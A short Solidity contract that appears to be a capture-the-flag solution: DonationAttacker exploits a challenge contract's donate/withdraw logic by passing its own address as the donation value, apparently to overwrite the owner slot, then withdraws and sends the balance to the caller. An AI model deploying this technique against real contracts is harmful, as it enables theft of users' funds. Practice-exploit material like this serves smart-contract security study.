pragma solidity ^0.8.9;

interface IChallenge {
    function isComplete() external view returns (bool);

    function donate(uint256 etherAmount) external payable;

    function withdraw() external;

}

contract DonationAttacker {
    IChallenge private challenge;
    constructor (address challengeAddress) {
        challenge = IChallenge(challengeAddress);
    }

    function attack() external payable {
        uint256 etherAmount = uint256(uint160(address(this)));
        uint256 donateAmount = etherAmount / (10 ** 36);
        challenge.donate{value:donateAmount}(etherAmount);
        challenge.withdraw();
        payable(msg.sender).transfer(address(this).balance);
        require(challenge.isComplete(),"challenge is not completed!");
    }

    receive() external payable {}
}